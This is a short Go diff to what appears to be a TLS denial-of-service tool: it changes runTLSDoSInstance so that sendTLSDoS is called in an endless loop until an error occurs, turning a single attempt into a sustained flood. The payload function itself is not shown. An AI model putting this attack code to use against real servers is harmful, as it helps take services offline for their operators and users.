@@ -74,23 +74,15 @@ func runTLSDoSInstance(addr *net.TCPAddr) {
 
 	//We can discard any data since we reset the connection
 	c.SetLinger(0)
-
-	ok, err := sendTLSDoS(c)
-	if err != nil {
-		if options.verbose {
-			log.Println(err)
+	for {
+		_, err := sendTLSDoS(c)
+		if err != nil {
+			if options.verbose {
+				log.Println(err)
+			}
+			return
 		}
-		return
 	}
-
-	if !options.verbose {
-		return
-	}
-	if ok {
-		log.Println("Success")
-		return
-	}
-	log.Println("Failed")
 }
 
 func main() {
